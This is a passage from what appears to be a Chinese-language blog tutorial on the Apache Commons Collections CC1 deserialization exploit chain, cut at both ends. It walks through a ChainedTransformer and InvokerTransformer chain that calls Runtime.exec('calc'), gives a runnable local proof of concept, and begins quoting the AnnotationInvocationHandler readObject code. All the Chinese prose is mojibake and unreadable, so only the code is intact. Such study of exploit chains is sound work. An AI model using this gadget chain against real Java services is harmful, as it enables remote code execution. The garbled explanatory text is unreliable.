<p><img src="/p/cc1/image-20240720145035782.png"
	width="787"
	height="212"
	srcset="/p/cc1/image-20240720145035782_hu8389042757565500730.png 480w, /p/cc1/image-20240720145035782_hu10069538954934653039.png 1024w"
	loading="lazy"
	
		alt="image-20240720145035782"
	
	
		class="gallery-image" 
		data-flex-grow="371"
		data-flex-basis="890px"
	
></p>
<p>Áé∞Âú®Êù•ÁúãÊàë‰ª¨ÁªôChainedTransformerÁ±ª‰º†ÂÖ•ÁöÑÊï∞ÁªÑÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">                                                             </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//Ê≥®ÊÑèÁêÜËß£</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>1.ÁÑ∂ÂêéÁé∞Âú®Â∞±ÊòØË∞ÉÁî®ÁöÑ‰º†ÂÖ•ÁöÑ<strong>Êï∞ÁªÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞</strong>ÁöÑtransformÊñπÊ≥ïÔºåÂç≥ConstantTransformerÁ±ªÁöÑtransform()ÊñπÊ≥ïÔºàÊ≠§Êó∂ÁöÑobject‰∏∫10ÔºâÔºö</p>
<p><img src="/p/cc1/image-20240720145529718.png"
	width="685"
	height="218"
	srcset="/p/cc1/image-20240720145529718_hu5600282536447071353.png 480w, /p/cc1/image-20240720145529718_hu7617806201816583204.png 1024w"
	loading="lazy"
	
		alt="image-20240720145529718"
	
	
		class="gallery-image" 
		data-flex-grow="314"
		data-flex-basis="754px"
	
></p>
<p>ËøôÈáåÁöÑtransformÊñπÊ≥ï‰ºöÁõ¥Êé•ËøîÂõûÊàë‰ª¨ÂÆû‰æãÂåñÊó∂ÂÆö‰πâÁöÑ<code>Runtime.class</code>ÔºåÊâÄ‰ª•ËøôÈáåÁöÑ10ÊúÄÁªàÊòØÊ≤°Áî®ÁöÑÔºåËøôÊ≠•ËøáÂêéobjectÁöÑÂÄºÂèò‰∏∫‰∫ÜRuntimeÂØπË±°ÔºåÂç≥<code>class java.lang.Runtime</code>„ÄÇ</p>
<p>2.<strong>ÁÑ∂ÂêéÁé∞Âú®Ë∞ÉÁî®ÁöÑÂ∞±ÊòØÊï∞ÁªÑÁ¨¨‰∫å‰∏™ÂÄºÁöÑÁ±ªÂÆû‰æãÂåñÂØπË±°</strong>Ôºå‰πüÂ∞±ÊòØ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">})</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁªßÁª≠Ë∑üËøõ</p>
<p><img src="/p/cc1/image-20240720150016864.png"
	width="1081"
	height="280"
	srcset="/p/cc1/image-20240720150016864_hu17287342989173862456.png 480w, /p/cc1/image-20240720150016864_hu3891569669940695062.png 1024w"
	loading="lazy"
	
		alt="image-20240720150016864"
	
	
		class="gallery-image" 
		data-flex-grow="386"
		data-flex-basis="926px"
	
></p>
<p>Ê≥®ÊÑèÁúã<code>input.getClass()</code>Ëøô‰∏ÄÊ≠•ËøáÂêéÁöÑclsÁöÑÂÄºÔºåÂ±ÖÁÑ∂ÂèòÊàê‰∫ÜClassÂØπË±°ÔºåËøô‰πüÊòØÊúÄÂºÄÂßãÊ≤°ÊÉ≥ÈÄöÁöÑÔºàËøôÈáåÁöÑInput‰∏çÊòØ‰∏Ä‰∏™Á±ªÁöÑÂÆû‰æãÂåñÂØπË±°ÔºâÔºå‰πüÂ∞±ÊòØÂØπ‰ªª‰Ωï<strong>Á±ªÁöÑclassÂØπË±°</strong>‰ΩøÁî®getClass()ÊñπÊ≥ïÊó∂ÈÉΩ‰ºöËøîÂõû<code>class java.lang.Class</code>„ÄÇ</p>
<p>ÁÑ∂ÂêéËøôÈáåË∞ÉÁî®getMethod()ÊñπÊ≥ïËé∑Âèñ<code>ClassÂØπË±°</code>ÁöÑ<code>getMethod()</code>ÊñπÊ≥ïÂπ∂Âú®returnÁöÑÂú∞Êñπ‰ΩøÁî®invoke()ÊñπÊ≥ïÊù•Ëé∑Âèñ<code>Runtime</code>Á±ªÁöÑ<code>getRuntime()</code>ÊñπÊ≥ïÔºàgetRuntimeÊñπÊ≥ï‰∏∫ÈùôÊÄÅÊñπÊ≥ïÔºâ</p>
<p>ÊâÄ‰ª•Áé∞Âú®ÁöÑobjectÂèò‰∏∫RuntimeÈáåÈù¢ÁöÑ<code>getRuntime()</code>ÊñπÊ≥ï„ÄÇ</p>
<p>3.ÁªßÁª≠Ôºå<strong>Áé∞Âú®Âà∞‰∫ÜÁ¨¨‰∏â‰∏™ÂÄºÁöÑÁ±ªÂÆû‰æãÂåñÂØπË±°</strong>Ôºå‰πüÂ∞±ÊòØÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">})</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøòÊòØËøõÂÖ•InvokerTransformerÁ±ªÁöÑtransformÊñπÊ≥ï</p>
<p><img src="/p/cc1/image-20240720155956708.png"
	width="1140"
	height="235"
	srcset="/p/cc1/image-20240720155956708_hu15317066475415178102.png 480w, /p/cc1/image-20240720155956708_hu5513332473397766001.png 1024w"
	loading="lazy"
	
		alt="image-20240720155956708"
	
	
		class="gallery-image" 
		data-flex-grow="485"
		data-flex-basis="1164px"
	
></p>
<p>ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÂêåÊ†∑ÁöÑÊòØgetClass()ÈÇ£ÈáåÔºåÁî±‰∫éÊàë‰º†ÂÖ•ÁöÑÊòØ‰∏Ä‰∏™getRuntime()<strong>ÊñπÊ≥ïÁöÑclassÂØπË±°</strong>ÔºåÊâÄ‰ª•ËøôÈáåËøîÂõûÁöÑÊòØ<code>class java.lang,reflect.Method</code>ÔºåÁÑ∂Âêé‰ΩøÁî®ÂèçÂ∞ÑËé∑ÂèñMethodÁ±ª‰∏≠ÁöÑinvokeÊñπÊ≥ïÔºåÊúÄÂêéÂÜçÂú®returnÈÉ®ÂàÜË∞ÉÁî®invokeÊñπÊ≥ïÊù•Âà©Áî®ÂèçÂ∞ÑËé∑ÂèñÁöÑinvoke()ÊñπÊ≥ïÔºåÂΩ¢Â¶ÇÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Method</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getRuntime&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Runtime</span><span class="p">)</span><span class="w"> </span><span class="n">f</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//ËøôÊ†∑Â∞±ÂèØ‰ª•Áõ¥Êé•ÊâßË°åÊñπÊ≥ï‰ªéËÄåËé∑ÂèñRuntimeÁ±ªÁöÑÂÆû‰æãÂåñÂØπË±°ÔºåËøòÊòØÂíåËøô‰∏™ÊñπÊ≥ïÊòØstaticÊúâÂÖ≥</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><em>ÊâÄ‰ª•Âú®ËøôÈáåÂ∫îËØ•Â∞±ÊòØÁõ∏ÂΩì‰∫éÁõ¥Êé•ÊâßË°ågetRuntime()ÊñπÊ≥ï</em>Ôºà<u>Ê≥®ÊÑèÁêÜËß£ÂØπÊØîÂèçÂ∞ÑÁöÑÁü•ËØÜÁÇπÔºåËøôÈáåÁöÑÁöÑÁî®Ê≥ïÈúÄË¶ÅÁêÜËß£ËÆ∞ÂøÜ</u>Ôºâ</p>
<p><strong>ÊâÄ‰ª•Âú®Ëøô‰∏ÄÊ≠•ÂêéÂèØ‰ª•Ëé∑ÂèñÂà∞<code>new Runtime</code>ÁöÑÂÆû‰æã„ÄÇ</strong></p>
<p>Âç≥Áé∞Âú®ÁöÑobjectÁöÑÂÄº‰∏∫RuntimeÁ±ªÁöÑÂÆû‰æã</p>
<p>4.<strong>Áé∞Âú®Â∞±Âà∞‰∫ÜÊï∞ÁªÑÁöÑÊúÄÂêé‰∏Ä‰∏™ÂÄº</strong>ÔºåÂç≥Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂêéÈù¢Â∞±ÊòØËé∑ÂèñRuntimeÁ±ªÁöÑexecÊñπÊ≥ïÔºåÂπ∂Âú®invokeÊó∂‰º†ÂÖ•calcÂºπÂá∫ËÆ°ÁÆóÊú∫„ÄÇ</p>
<p><strong>5.ÊÄªÁªì</strong></p>
<p>ÊúÄÂêéÁÆÄÂçïÊÄªÁªì‰∏Ä‰∏ãchainÈìæ‰∏≠ÁöÑÊµÅÁ®ãÔºö</p>
<ul>
<li>‰ΩøÁî®ConstantTransformerÁöÑtransformÊñπÊ≥ïËøîÂõûRuntime.class</li>
<li>ÂÜçÂú®InvokerTransformerÁöÑtransformÊñπÊ≥ïËé∑ÂèñgetMethodÊñπÊ≥ïÂπ∂Âà©Áî®Ëé∑ÂèñgetRuntime()ÊñπÊ≥ï</li>
<li>ÂÜçÂú®InvokerTransformerÁöÑtransform‰∏≠Ëé∑ÂèñinvokeÊñπÊ≥ïÊù•Ë∞ÉÁî®getRuntime()ÊñπÊ≥ï‰ªéËÄåËé∑ÂèñÂà∞RuntimeÁ±ªÂÆû‰æã„ÄÇ</li>
<li>ÊúÄÂêéËøòÊòØÂú®InvokerTransformerÁöÑtransformÊñπÊ≥ïËé∑ÂèñÂà∞execÊñπÊ≥ïÂπ∂‰º†ÂÖ•calcÂºπÂá∫ËÆ°ÁÆóÊú∫</li>
</ul>
<p><u>ÂàÜÊûêÁªìÊùü„ÄÇ</u></p>
<p>ÂÖ∂ÂÆûËøòÂèØ‰ª•Êõ¥ÁÆÄÂçïÔºåÁªìÂêàgetRuntime()ÊñπÊ≥ïÁöÑÁâπÊÄßÔºåÂèØ‰ª•Â¶Ç‰∏ãÊûÑÈÄ†Ôºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Runtime</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">()),</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w"> </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">ctf</span><span class="w"> </span><span class="o">=</span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">chain</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctf</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">10</span><span class="p">,</span><span class="s">&#34;xxx&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂêåÊ†∑ÊàêÂäüÂºπÂá∫ËÆ°ÁÆóÊú∫</p>
<p><img src="/p/cc1/image-20240720165342215.png"
	width="1270"
	height="360"
	srcset="/p/cc1/image-20240720165342215_hu17294061629506351066.png 480w, /p/cc1/image-20240720165342215_hu16164270435977294384.png 1024w"
	loading="lazy"
	
		alt="image-20240720165342215"
	
	
		class="gallery-image" 
		data-flex-grow="352"
		data-flex-basis="846px"
	
></p>
<p>Áªº‰∏äÁ¨¨‰∫åÁßçÁöÑÁÆÄÂåñ‰ª£Á†ÅÊõ¥ÁÆÄÊ¥ÅÔºåÁ¨¨‰∏ÄÁßçÂÅèÊäÄÂ∑ßÊÄßÔºåÈÉΩË¶ÅÁêÜËß£Â≠¶‰π†Âà©Áî®„ÄÇ</p>
<p>‰ΩÜÊòØÁ¨¨‰∫åÁßç‰ª£Á†ÅÊú¨Ë∫´Âú®ÂÖ∑‰ΩìÁöÑËøêÁî®‰∏≠Âπ∂Ê≤°ÊúâÁî®Ôºå<strong>ËøôÊòØÂõ†‰∏∫RuntimeÁ±ªÂπ∂Ê≤°ÊúâÂÆûÁé∞SerializableÊé•Âè£</strong>ÔºåËÄåËß£ÂÜ≥ÊñπÊ≥ïÂ∞±ÊòØÁ¨¨‰∏ÄÁßçÔºåÊâÄ‰ª•<u>Âú®ÂÆûÈôÖËøêÁî®‰∏≠ËøòÊòØ‰ΩøÁî®ÁöÑÁ¨¨‰∏ÄÁßç„ÄÇ</u></p>
<h6 id="ÂÆûÈôÖÂà©Áî®">ÂÆûÈôÖÂà©Áî®
</h6><p>‰∏äÈù¢ÁöÑ‰ª£Á†ÅÂè™ÊòØ‰∏Ä‰∏™Áî®Êù•Âú®Êú¨Âú∞ÊµãËØïÁöÑÁ±ªÔºåÂπ∂‰∏îÊòØÊàë‰ª¨ÈÄöËøáÊûÑÈÄ†‰ª£Á†ÅÊù•ÂêØÁî®Á¨¨‰∏Ä‰∏™transform()ÊñπÊ≥ïÁªßËÄåÂÆûÁé∞ÁöÑÈìæÂ≠ê„ÄÇÂú®ÂÆûÈôÖÂèçÂ∫èÂàóÂåñÊºèÊ¥û‰∏≠ÔºåÊàë‰ª¨ÈúÄË¶ÅÂÆÉÁöÑreadObject‰ª£Á†ÅÈÄªËæë‰∏≠ÊúâÁ±ª‰ººMap.putÊñπÊ≥ïÁöÑÊìç‰Ωú„ÄÇ</p>
<p>Âú®ËøôÈáåÂèØ‰ª•Âà©Áî®Âà∞ÁöÑÁ±ªÂ∞±ÊòØ<code>sun.reflect.annotation.AnnotationInvocationHandler</code>„ÄÇ</p>
<p>Áé∞Âú®Êù•ÁúãËøô‰∏™Á±ªÁöÑreadObject()ÊñπÊ≥ïÔºà<strong>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØËøôÊòØ8u71‰ª•ÂâçÁöÑ‰ª£Á†ÅÔºå8u71‰ª•ÂêéÂÅö‰∫Ü‰∏Ä‰∫õ‰øÆÊîπ</strong>ÔºåËøô‰∏™ÂêéÈù¢ÂÜçËØ¥ÔºâÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">throws</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">s</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Check to make sure that types have not evolved incompatibly</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AnnotationType</span><span class="w"> </span><span class="n">annotationType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">annotationType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AnnotationType</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="n">type</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="n">IllegalArgumentException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// Class is no longer an annotation type; time to punch out</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">InvalidObjectException</span><span class="p">(</span><span class="s">&#34;Non-annotation type in annotation serial stream&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;&gt;</span><span class="w"> </span><span class="n">memberTypes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">annotationType</span><span class="p">.</span><span class="na">memberTypes</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// If there are annotation members without values, that</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// situation is handled by the invoke method.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">memberValue</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">memberValues</span><span class="p">.</span><span class="na">entrySet</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">memberValue</span><span class="p">.</span><span class="na">getKey</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">memberType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">memberTypes</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">memberType</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// i.e. member still exists</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">memberValue</span><span class="p">.</span><span class="na">getValue</span><span class="p">();</span><span class="w">
